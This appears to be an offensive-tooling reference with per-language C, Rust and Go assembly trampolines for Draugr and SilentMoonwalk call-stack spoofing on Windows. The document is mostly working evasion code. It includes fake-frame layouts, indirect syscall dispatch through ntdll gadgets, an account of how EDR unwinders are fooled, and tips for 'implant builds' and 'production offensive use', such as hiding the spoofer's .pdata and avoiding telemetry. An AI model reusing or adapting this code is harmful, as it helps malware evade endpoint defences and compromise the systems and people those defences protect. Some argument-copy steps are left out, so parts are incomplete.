# Language Patterns — C, Rust, Go Trampolines

Per-language skeletons for Draugr / SilentMoonwalk trampolines. Each pattern is compilable; verify against your target Windows build before shipping.

## Table of Contents

1. C (mingw-w64, AT&T inline asm) — Draugr trampoline
2. Rust (`#[naked]` + `global_asm!`) — Draugr trampoline
3. Go (Plan 9 `.s`) — Draugr trampoline
4. SpoofContext struct layout rules (all languages)
5. SilentMoonwalk DESYNC — layout + C / Rust / Go trampolines
6. Interop pitfalls (LLVM RBX clobber, Go goroutine safety, MSVC `_chkstk`)

---

## 1. C — Draugr trampoline (mingw-w64)

```c
/* draugr_trampoline.c — compile with:
 *   x86_64-w64-mingw32-gcc -O2 -nostdlib -fno-ident
 *     -fno-asynchronous-unwind-tables -ffunction-sections -fdata-sections
 *     -Wl,--gc-sections draugr_trampoline.c -c
 */

#include <stdint.h>

typedef struct {
    uintptr_t jmp_rbx_gadget;   /* +0  */
    uintptr_t base_thunk_ret;   /* +8  */
    uintptr_t rtl_start_ret;    /* +16 */
    uintptr_t frame1_size;      /* +24 */
    uintptr_t frame2_size;      /* +32 */
    uintptr_t trampoline_size;  /* +40 */
} SpoofContext;

/* Spoof buffer layout:
 *   [fakeStackTop]       ← top (aligned 16)
 *   [sentinel 0]
 *   [RtlUserThreadStart retaddr][... frame2 body ...]
 *   [BaseThreadInitThunk retaddr][... frame1 body ...]
 *   [JmpRbx gadget addr][... trampoline body (shadow + args) ...]
 *   ...
 *   [fixup_addr]         ← [fakeStackTop - 8]  (RBX will point here)
 *   [buf_pin]            ← bottom
 */

extern uint32_t draugr_syscall(uint16_t ssn, uintptr_t syscall_gadget,
                               const SpoofContext *ctx,
                               void *buf_pin, uintptr_t fake_stack_top,
                               uintptr_t a1, uintptr_t a2,
                               uintptr_t a3, uintptr_t a4,
                               uintptr_t a5, uintptr_t a6,
                               uintptr_t a7, uintptr_t a8,
                               uintptr_t a9, uintptr_t a10, uintptr_t a11);

__attribute__((naked))
uint32_t draugr_syscall(uint16_t ssn, uintptr_t syscall_gadget,
                        const SpoofContext *ctx,
                        void *buf_pin, uintptr_t fake_stack_top,
                        uintptr_t a1, uintptr_t a2,
                        uintptr_t a3, uintptr_t a4,
                        uintptr_t a5, uintptr_t a6,
                        uintptr_t a7, uintptr_t a8,
                        uintptr_t a9, uintptr_t a10, uintptr_t a11)
{
    __asm__ volatile(
        /* Save callee-saved */
        "pushq %%rbx\n\t"
        "pushq %%rbp\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        /* Anchor real RSP in R12 */
        "movq  %%rsp, %%r12\n\t"
        /* ctx in RDI per... wait, Win64 ABI has ctx in R8 */
        /* Windows ABI: RCX=ssn, RDX=syscall_gadget, R8=ctx, R9=buf_pin,
         *              [RSP+0x28]=fake_stack_top, [RSP+0x30]=a1, ... */
        "movzwl %%cx, %%eax\n\t"              /* SSN → EAX                */
        "movq   %%rdx, %%r15\n\t"             /* R15 = syscall_gadget     */
        "movq   %%r8,  %%r14\n\t"             /* R14 = ctx                */
        /* Switch to fake stack */
        "movq   88(%%r12), %%rsp\n\t"         /* fake_stack_top           */
        /* Plant sentinel */
        "pushq  $0\n\t"
        /* Frame2: RtlUserThreadStart */
        "subq   32(%%r14), %%rsp\n\t"         /* frame2_size              */
        "movq   16(%%r14), %%r13\n\t"
        "movq   %%r13, (%%rsp)\n\t"
        /* Frame1: BaseThreadInitThunk */
        "subq   24(%%r14), %%rsp\n\t"         /* frame1_size              */
        "movq   8(%%r14),  %%r13\n\t"
        "movq   %%r13, (%%rsp)\n\t"
        /* Trampoline frame: JmpRbx gadget at top */
        "subq   40(%%r14), %%rsp\n\t"         /* trampoline_size          */
        "movq   0(%%r14),  %%r13\n\t"
        "movq   %%r13, (%%rsp)\n\t"
        /* Args: 1-4 in RCX/RDX/R8/R9; 5+ at [RSP+0x28], [RSP+0x30], ... */
        /* (caller pushed them; translate from saved stack via R12)      */
        "movq   0x30(%%r12), %%rcx\n\t"       /* a1                       */
        "movq   0x38(%%r12), %%rdx\n\t"       /* a2                       */
        "movq   0x40(%%r12), %%r8\n\t"        /* a3                       */
        "movq   0x48(%%r12), %%r9\n\t"        /* a4                       */
        /* (copy a5..a11 onto the trampoline frame stack; omitted for brevity —
         *  see Draugr repo draugr_spoof_x64.s for full copy loop)        */
        /* Syscall ABI: R10 = RCX */
        "movq   %%rcx, %%r10\n\t"
        /* Set RBX so the gadget's JMP [RBX] lands in our fixup */
        "leaq   fixup(%%rip), %%r13\n\t"
        "movq   %%r13, -8(%%rsp)\n\t"
        "leaq   -8(%%rsp), %%rbx\n\t"
        /* Dispatch: CALL syscall;ret gadget */
        "callq  *%%r15\n\t"
        /* syscall returns; gadget JMP [RBX] lands here */
        "fixup:\n\t"
        /* Restore real RSP */
        "movq   %%r12, %%rsp\n\t"
        "popq   %%r15\n\t"
        "popq   %%r14\n\t"
        "popq   %%r13\n\t"
        "popq   %%r12\n\t"
        "popq   %%rbp\n\t"
        "popq   %%rbx\n\t"
        "ret\n\t"
        : : : "memory"
    );
}
```

**Caveats for C**:
- `__attribute__((naked))` on GCC respects that no prologue/epilogue is emitted. Every register save/restore must be explicit.
- `(%rsp)` dereference syntax is AT&T; `[rsp]` is Intel. Keep the dialect consistent.
- `test byte ptr [gs:0x30+0x68], ...` references are unnecessary here because we bypass the ntdll stub entirely.

---

## 2. Rust — Draugr trampoline

```rust
// src/draugr.rs — no_std, naked_functions stabilized in Rust 1.88
#![no_std]

use core::arch::naked_asm;

#[repr(C)]
pub struct SpoofContext {
    pub jmp_rbx_gadget:  usize,  // +0
    pub base_thunk_ret:  usize,  // +8
    pub rtl_start_ret:   usize,  // +16
    pub frame1_size:     usize,  // +24
    pub frame2_size:     usize,  // +32
    pub trampoline_size: usize,  // +40
}

#[naked]
#[no_mangle]
pub unsafe extern "win64" fn draugr_syscall(
    _ssn: u16, _gadget: usize, _ctx: *const SpoofContext,
    _buf_pin: *mut u8, _fake_stack_top: usize,
    _a1: usize, _a2: usize, _a3: usize, _a4: usize,
    _a5: usize, _a6: usize, _a7: usize, _a8: usize,
    _a9: usize, _a10: usize, _a11: usize,
) -> u32 {
    naked_asm!(
        "push rbx",
        "push rbp",
        "push r12",
        "push r13",
        "push r14",
        "push r15",
        "mov  r12, rsp",
        "movzx eax, cx",
        "mov  r15, rdx",
        "mov  r14, r8",
        "mov  rsp, [r12 + 88]",
        "push 0",
        "sub  rsp, [r14 + 32]",   // frame2_size
        "mov  r13, [r14 + 16]",
        "mov  [rsp], r13",
        "sub  rsp, [r14 + 24]",   // frame1_size
        "mov  r13, [r14 + 8]",
        "mov  [rsp], r13",
        "sub  rsp, [r14 + 40]",   // trampoline_size
        "mov  r13, [r14 + 0]",
        "mov  [rsp], r13",
        "mov  rcx, [r12 + 0x30]",
        "mov  rdx, [r12 + 0x38]",
        "mov  r8,  [r12 + 0x40]",
        "mov  r9,  [r12 + 0x48]",
        // copy a5..a11 loop omitted
        "mov  r10, rcx",
        "lea  r13, [rip + 2f]",
        "mov  [rsp - 8], r13",
        "lea  rbx, [rsp - 8]",
        "call r15",
        "2:",
        "mov  rsp, r12",
        "pop  r15",
        "pop  r14",
        "pop  r13",
        "pop  r12",
        "pop  rbp",
        "pop  rbx",
        "ret",
    );
}
```

**Rust-specific gotchas**:
- `extern "win64"` is required; default `extern "C"` on `x86_64-pc-windows-msvc` is already Win64, but explicit is safer and works uniformly across targets.
- `#[naked]` functions must not reference local variables. All inputs come via registers (RCX/RDX/R8/R9) or `[rsp+imm]`.
- `naked_asm!` accepts Intel syntax by default.
- **LLVM RBX**: even with `#[naked]`, LLVM may still touch RBX in surrounding codegen if you `call` this from a non-naked function. Mitigate by wrapping the caller in `asm!("", clobber_abi("win64"))` or by storing/restoring RBX in the caller.
- Link with `#[link_args = "/NODEFAULTLIB /ENTRY:dll_main"]` for implant builds to avoid pulling in CRT.

---

## 3. Go — Draugr trampoline (Plan 9 syntax)

```go
// draugr_spoof_x64.s
//
//   func reCycallSpoofed(callid uint16, syscallA uintptr, spoofCtx uintptr,
//                         bufPin unsafe.Pointer, fakeStackTop uintptr,
//                         argh ...uintptr) (errcode uint32)
//
// SpoofContext layout: same as C/Rust.

#define maxargs 18

TEXT ·reCycallSpoofed(SB), 4, $0-72
    PUSHQ BX
    PUSHQ BP
    PUSHQ R12
    PUSHQ R13
    PUSHQ R14
    PUSHQ R15
    MOVQ  SP, R12                // R12 = real SP after pushes

    XORQ AX, AX
    MOVW 56(R12), AX             // callid (uint16)
    MOVQ 64(R12), R15            // syscall gadget
    MOVQ 72(R12), R14            // SpoofContext *
    MOVQ 96(R12), SI             // argh_base
    MOVQ 104(R12), CX            // argh_len

    // Validate arg count
    CMPL CX, $maxargs
    JLE  2(PC)
    INT  $3

    // Switch to fake stack
    MOVQ 88(R12), SP             // fakeStackTop

    // Plant sentinel
    PUSHQ $0

    // Frame2: RtlUserThreadStart
    SUBQ 32(R14), SP
    MOVQ 16(R14), R13
    MOVQ R13, 0(SP)

    // Frame1: BaseThreadInitThunk
    SUBQ 24(R14), SP
    MOVQ  8(R14), R13
    MOVQ R13, 0(SP)

    // Trampoline frame: JmpRbx gadget
    SUBQ 40(R14), SP
    MOVQ  0(R14), R13
    MOVQ R13, 0(SP)

    // (Copy args 5+ to [SP+0x28..] omitted for brevity.)

    MOVQ  0(SI), CX              // arg1
    MOVQ  8(SI), DX              // arg2
    MOVQ 16(SI), R8              // arg3
    MOVQ 24(SI), R9              // arg4
    MOVQ CX, R10                 // syscall ABI

    // Fixup slot for JMP [RBX]
    LEAQ fixup<>(SB), R13
    MOVQ R13, -8(SP)
    LEAQ -8(SP), BX

    CALL R15                     // syscall;ret gadget

fixup<>:
    MOVQ R12, SP                 // restore real SP
    POPQ R15
    POPQ R14
    POPQ R13
    POPQ R12
    POPQ BP
    POPQ BX
    MOVL AX, errcode+112(FP)
    RET
```

**Go-specific caveats**:

- The Plan 9 toolchain is Go's own fork. `MOVQ` = AT&T `movq`, **but** addressing mode syntax differs: `0x10(AX)` in Plan 9 vs `0x10(%rax)` in AT&T. No `%` prefix.
- `BYTE $0x90` NOPs: historically needed between instructions the Go assembler "helpfully" reorders or fuses. Modern Go (1.22+) is less aggressive, but keep them around call sites and between conceptually distinct stanzas — cheap insurance.
- `FP` references the frame-pointer pseudo-register (= argument base on entry); it is stable regardless of RSP manipulation. `errcode+112(FP)` resolves to the return-value slot in the caller's frame.
- **Goroutine safety**: the Go scheduler can preempt a goroutine on any preemption check (stack growth, GC safe-point). During the time SP is pointing at the fake stack, **do not trigger any Go runtime call** — no `runtime.morestack`, no channel ops, no map access. Keep the trampoline straight-line.
- Do not touch `GS:0x30` — that's the current thread's `g` pointer; corrupting it deadlocks the scheduler.

---

## 4. SpoofContext struct layout rules

These apply regardless of language.

```
Offset 0x00: uintptr  jmp_rbx_gadget       (Draugr / SM)
Offset 0x08: uintptr  base_thunk_ret       (Draugr)
       0x08: uintptr  addrspx_value        (SM)  — overlap OK if you commit to one strategy
Offset 0x10: uintptr  rtl_start_ret / jmp_rbx_gadget
Offset 0x18: uintptr  frame1_size / first_frame_retaddr
Offset 0x20: uintptr  frame2_size / second_frame_retaddr
Offset 0x28: uintptr  trampoline_size / first_frame_size
Offset 0x30: uintptr  -- / second_frame_size
Offset 0x38: uintptr  -- / jmp_rbx_frame_size
Offset 0x40: uintptr  -- / rbp_plant_offset
```

**Rules**:
- Field offsets are **referenced from ASM** by immediate. Never reorder fields mid-project.
- Always document offsets in C comments / Rust doc / Go comments above each field.
- Test strategy for layout drift: write a compile-time or init-time assertion (`_Static_assert(offsetof(SpoofContext, rtl_start_ret) == 0x10)`). In Rust: `const _: [(); 0x10] = [(); core::mem::offset_of!(SpoofContext, rtl_start_ret)];`

---

## 5. SilentMoonwalk DESYNC — layout + per-language trampolines

SM extends Draugr's 3 fields to 9 fields. Replace the Draugr context with:

```c
typedef struct {
    uintptr_t add_rsp_gadget;       /* +0   AddRspX;ret gadget                    */
    uintptr_t add_rsp_value;        /* +8   X (stack skip amount encoded in gadget) */
    uintptr_t jmp_rbx_gadget;       /* +16  JMP [RBX] gadget (small frame)        */
    uintptr_t first_frame_retaddr;  /* +24  RIP inside SET_FPREG function, after CALL */
    uintptr_t second_frame_retaddr; /* +32  RIP inside PUSH_NONVOL(rbp) function, after CALL */
    uintptr_t first_frame_size;     /* +40                                         */
    uintptr_t second_frame_size;    /* +48                                         */
    uintptr_t jmp_rbx_frame_size;   /* +56                                         */
    uintptr_t rbp_plant_offset;     /* +64  offset within SecondFrame where fake rbp goes */
} DesyncContext;
```

### Fake stack layout (top to bottom)

```
[sentinel 0]
[FirstFrame retaddr]    ← after a CALL inside a SET_FPREG function
[FirstFrame body]       ← first_frame_size - 8 bytes
[SecondFrame retaddr]   ← after a CALL inside a PUSH_NONVOL(rbp) function
[SecondFrame body]      ← contains fake rbp at rbp_plant_offset,
                          pointing into FirstFrame body
[JmpRbx gadget addr]
[JmpRbx frame body]     ← shadow (0x20) + stack args for the target NT API
[AddRspX gadget addr]   ← acts as "return" from syscall;ret
[AddRspX skip region]   ← add_rsp_value bytes that AddRspX pops
[syscall_gadget]        ← syscall;ret inside ntdll
```

### Execution flow

```
CALL syscall_gadget
  → syscall   (kernel runs)
  → ret       (pops syscall_gadget's own sentinel if present, else lands)
  → AddRspX   (ADD RSP, X ; RET)
  → lands on JmpRbxGadget
  → JMP [RBX] (RBX preset to point at fixup slot in trampoline caller)
  → fixup    (trampoline restores real RSP)
```

### Unwinder reconstruction

Captured by EDR at syscall trap:

```
ntdll!Zw* + 0x14
  ← JmpRbx frame   (valid small frame, passes .pdata check)
  ← SecondFrame    (PUSH_NONVOL rbp reads planted fake rbp → chains to FirstFrame)
  ← FirstFrame     (SET_FPREG terminates walk cleanly)
```

### 5.1 C (mingw-w64) — SM trampoline

```c
/* silentmoonwalk_trampoline.c — mingw-w64, AT&T inline asm. Same link flags as §1. */

#include <stdint.h>

typedef struct {
    uintptr_t add_rsp_gadget;       /* +0  */
    uintptr_t add_rsp_value;        /* +8  */
    uintptr_t jmp_rbx_gadget;       /* +16 */
    uintptr_t first_frame_retaddr;  /* +24 */
    uintptr_t second_frame_retaddr; /* +32 */
    uintptr_t first_frame_size;     /* +40 */
    uintptr_t second_frame_size;    /* +48 */
    uintptr_t jmp_rbx_frame_size;   /* +56 */
    uintptr_t rbp_plant_offset;     /* +64 */
} DesyncContext;

extern uint32_t sm_syscall(uint16_t ssn, uintptr_t syscall_gadget,
                           const DesyncContext *ctx,
                           void *buf_pin, uintptr_t fake_stack_top,
                           /* args */ ...);

__attribute__((naked))
uint32_t sm_syscall(uint16_t ssn, uintptr_t syscall_gadget,
                    const DesyncContext *ctx,
                    void *buf_pin, uintptr_t fake_stack_top, ...)
{
    __asm__ volatile(
        /* Callee-saved + real RSP anchor */
        "pushq %%rbx\n\t" "pushq %%rbp\n\t"
        "pushq %%r12\n\t" "pushq %%r13\n\t"
        "pushq %%r14\n\t" "pushq %%r15\n\t"
        "movq  %%rsp, %%r12\n\t"

        /* Win64 ABI: RCX=ssn, RDX=syscall_gadget, R8=ctx, R9=buf_pin,
         *            [RSP+0x28]=fake_stack_top, [RSP+0x30]=arg1 ... */
        "movzwl %%cx, %%eax\n\t"               /* SSN → EAX */
        "movq   %%rdx, %%r15\n\t"              /* R15 = syscall_gadget */
        "movq   %%r8,  %%r14\n\t"              /* R14 = ctx */

        /* Switch to fake stack */
        "movq   0x58(%%r12), %%rsp\n\t"        /* fake_stack_top from [RSP+0x28] saved */
        "pushq  $0\n\t"                         /* sentinel */

        /* FirstFrame */
        "subq   40(%%r14), %%rsp\n\t"          /* first_frame_size */
        "movq   24(%%r14), %%r13\n\t"          /* first_frame_retaddr */
        "movq   %%r13, (%%rsp)\n\t"
        "movq   %%rsp, %%r11\n\t"              /* R11 = addr of FirstFrame (for rbp plant) */

        /* SecondFrame */
        "subq   48(%%r14), %%rsp\n\t"          /* second_frame_size */
        "movq   32(%%r14), %%r13\n\t"          /* second_frame_retaddr */
        "movq   %%r13, (%%rsp)\n\t"

        /* Plant fake RBP at rbp_plant_offset inside SecondFrame body */
        "movq   %%rsp, %%r10\n\t"
        "addq   64(%%r14), %%r10\n\t"          /* R10 = rsp + rbp_plant_offset */
        "movq   %%r11, (%%r10)\n\t"            /* [plant] = FirstFrame addr */

        /* JmpRbx frame */
        "subq   56(%%r14), %%rsp\n\t"          /* jmp_rbx_frame_size */
        "movq   16(%%r14), %%r13\n\t"          /* jmp_rbx_gadget */
        "movq   %%r13, (%%rsp)\n\t"

        /* AddRspX cap (acts as syscall;ret's return target) */
        "movq    0(%%r14), %%r13\n\t"          /* add_rsp_gadget */
        /* Push gadget so that syscall;ret's RET pops it into RIP */
        /* (args are planted inside JmpRbx frame body at [rsp+0x8..] in the usual way) */

        /* Arg shuffle to Win64 syscall ABI (arg5+ planted on JmpRbx frame — omitted) */
        "movq   0x60(%%r12), %%rcx\n\t"        /* arg1 */
        "movq   0x68(%%r12), %%rdx\n\t"        /* arg2 */
        "movq   0x70(%%r12), %%r8\n\t"         /* arg3 */
        "movq   0x78(%%r12), %%r9\n\t"         /* arg4 */
        "movq   %%rcx, %%r10\n\t"              /* syscall ABI */

        /* RBX → fixup slot (JMP [RBX] target after AddRspX;JmpRbx chain) */
        "leaq   sm_fixup(%%rip), %%r13\n\t"
        "movq   %%r13, -8(%%rsp)\n\t"
        "leaq   -8(%%rsp), %%rbx\n\t"

        /* Dispatch: CALL syscall;ret */
        "callq  *%%r15\n\t"

        "sm_fixup:\n\t"
        "movq   %%r12, %%rsp\n\t"
        "popq   %%r15\n\t" "popq   %%r14\n\t"
        "popq   %%r13\n\t" "popq   %%r12\n\t"
        "popq   %%rbp\n\t" "popq   %%rbx\n\t"
        "ret\n\t"
        : : : "memory"
    );
}
```

**Why this is more fragile than Draugr**: the fake rbp plant is position-critical. If `rbp_plant_offset` was computed for a SecondFrame with chained unwind info you failed to resolve (§2 of frame-math.md), the unwinder mis-reads rbp and the stack walk visibly diverges from legit. Always dump a spoofed call stack with `RtlCaptureStackBackTrace` in a debug harness and compare against a real call stack from the same thread to validate.

### 5.2 Rust — SM trampoline

```rust
#[repr(C)]
pub struct DesyncContext {
    pub add_rsp_gadget:       usize, // +0
    pub add_rsp_value:        usize, // +8
    pub jmp_rbx_gadget:       usize, // +16
    pub first_frame_retaddr:  usize, // +24
    pub second_frame_retaddr: usize, // +32
    pub first_frame_size:     usize, // +40
    pub second_frame_size:    usize, // +48
    pub jmp_rbx_frame_size:   usize, // +56
    pub rbp_plant_offset:     usize, // +64
}

#[naked]
#[no_mangle]
pub unsafe extern "win64" fn sm_syscall(
    _ssn: u16, _gadget: usize, _ctx: *const DesyncContext,
    _buf_pin: *mut u8, _fake_stack_top: usize,
    _a1: usize, _a2: usize, _a3: usize, _a4: usize,
    _a5: usize, _a6: usize, _a7: usize, _a8: usize,
    _a9: usize, _a10: usize, _a11: usize,
) -> u32 {
    core::arch::naked_asm!(
        "push rbx", "push rbp",
        "push r12", "push r13", "push r14", "push r15",
        "mov  r12, rsp",

        "movzx eax, cx",
        "mov  r15, rdx",
        "mov  r14, r8",
        "mov  rsp, [r12 + 0x58]",              // fake_stack_top
        "push 0",

        // FirstFrame
        "sub  rsp, [r14 + 40]",
        "mov  r13, [r14 + 24]",
        "mov  [rsp], r13",
        "mov  r11, rsp",                       // save FirstFrame addr for rbp plant

        // SecondFrame
        "sub  rsp, [r14 + 48]",
        "mov  r13, [r14 + 32]",
        "mov  [rsp], r13",

        // rbp plant
        "mov  r10, rsp",
        "add  r10, [r14 + 64]",
        "mov  [r10], r11",

        // JmpRbx frame
        "sub  rsp, [r14 + 56]",
        "mov  r13, [r14 + 16]",
        "mov  [rsp], r13",

        // Arg shuffle
        "mov  rcx, [r12 + 0x60]",
        "mov  rdx, [r12 + 0x68]",
        "mov  r8,  [r12 + 0x70]",
        "mov  r9,  [r12 + 0x78]",
        "mov  r10, rcx",

        "lea  r13, [rip + 2f]",
        "mov  [rsp - 8], r13",
        "lea  rbx, [rsp - 8]",

        "call r15",
        "2:",
        "mov  rsp, r12",
        "pop  r15", "pop  r14", "pop  r13",
        "pop  r12", "pop  rbp", "pop  rbx",
        "ret",
    );
}
```

Same caveats as Draugr Rust (§2): `#[naked]` callers must manage RBX; LLVM won't spill across the naked boundary but *surrounding* code can. Wrap call sites with `clobber_abi("win64")` to be safe.

### 5.3 Go — SM trampoline (Plan 9 syntax)

```go
// silentmoonwalk_spoof_x64.s
//
// func smSpoofed(ssn uint16, syscallGadget uintptr, ctx uintptr,
//                bufPin unsafe.Pointer, fakeStackTop uintptr,
//                argh ...uintptr) (errcode uint32)

TEXT ·smSpoofed(SB), NOSPLIT, $0-72
    PUSHQ BX; PUSHQ BP
    PUSHQ R12; PUSHQ R13; PUSHQ R14; PUSHQ R15
    MOVQ  SP, R12

    XORQ AX, AX
    MOVW 56(R12), AX                       // ssn
    MOVQ 64(R12), R15                      // syscall gadget
    MOVQ 72(R12), R14                      // DesyncContext *
    MOVQ 96(R12), SI; MOVQ 104(R12), DI    // argh base + len

    MOVQ 88(R12), SP                       // fakeStackTop
    PUSHQ $0

    // FirstFrame
    SUBQ 40(R14), SP
    MOVQ 24(R14), R13
    MOVQ R13, 0(SP)
    MOVQ SP, R11                           // save FirstFrame addr

    // SecondFrame
    SUBQ 48(R14), SP
    MOVQ 32(R14), R13
    MOVQ R13, 0(SP)

    // rbp plant
    MOVQ SP, R10
    ADDQ 64(R14), R10
    MOVQ R11, 0(R10)

    // JmpRbx frame
    SUBQ 56(R14), SP
    MOVQ 16(R14), R13
    MOVQ R13, 0(SP)

    // Args
    MOVQ  0(SI), CX
    MOVQ  8(SI), DX
    MOVQ 16(SI), R8
    MOVQ 24(SI), R9
    MOVQ CX, R10

    // BYTE NOPs prevent the Go assembler from reordering around the call.
    BYTE $0x90; BYTE $0x90

    LEAQ smFixup<>(SB), R13
    MOVQ R13, -8(SP)
    LEAQ -8(SP), BX

    CALL R15

smFixup<>:
    MOVQ R12, SP
    POPQ R15; POPQ R14; POPQ R13
    POPQ R12; POPQ BP; POPQ BX
    MOVL AX, errcode+112(FP)
    RET
```

**Go-specific SM caveat**: `NOSPLIT` is non-negotiable here. The frame math already pushes RSP near a Go-runtime-detectable low-water mark; allowing `morestack` preemption in the middle of the frame plant would be catastrophic. Also: avoid using any Go slice growth after the trampoline returns until the buffer passed via `bufPin` is cleared — the race detector flags writes through the fake stack region as unknown memory.

---

## 6. Interop pitfalls (all languages)

**LLVM / GCC RBX allocation**: inline asm clobbers must list RBX. In Rust with `#[naked]`, wrap the *caller* in a no-op asm with `clobber_abi("win64")`. In GCC with `__attribute__((naked))`, the function body is the entire asm; no issue. In non-naked inline asm: always include `"%rbx"` in the clobber list.

**Go: race detector and `unsafe.Pointer`**: `-race` builds instrument every pointer write. `bufPin` arriving as `unsafe.Pointer` is fine, but do not expose the fake stack addresses to Go code — they look like valid pointers to the race detector and will produce false reports.

**MSVC `_chkstk` injection**: any C function with stack allocation > 1 page (4096 bytes) gets a call to `_chkstk` injected in the prologue. This is a CFG-marked indirect call that generates telemetry. Mitigation: use mingw-w64 instead of MSVC for the trampoline file, or declare a `#pragma check_stack(off)` around the naked function.

**Go: `writeBarrier` during GC**: storing an `unsafe.Pointer`-derived value into a struct field triggers a write barrier in the GC mark phase. In the spoof trampoline, your SpoofContext is not GC-visible; but if you store gadget addresses into a Go-managed struct, ensure it is `unsafe.Pointer` typed (not `uintptr`) only when the GC needs to see it. For stable-address values resolved once at init, `uintptr` is correct.

**C / Rust: PE `.pdata` of the spoofer itself**: your spoofer's ASM trampoline will have its own `.pdata` entry (MSVC/mingw-w64 auto-generate one). Inspectors reversing your binary see a "stub" with no real prologue. Two options:
1. Emit a fake `.pdata` entry that matches what a legitimate function would have (requires custom linker scripts).
2. Strip `.pdata` entirely with `-fno-asynchronous-unwind-tables` (GCC) or `/NOPDATA` (MSVC — experimental). This breaks SEH inside the spoofer, which is acceptable because the spoofer cannot catch exceptions anyway.

**Go: no reliable `.pdata` suppression**. Go always emits `.pdata` for every function. Mitigation: patch the Go toolchain (aggressive) or accept the entry as a detection signal. For production offensive use, prefer C or Rust for the trampoline and call from Go via CGo only if unavoidable.
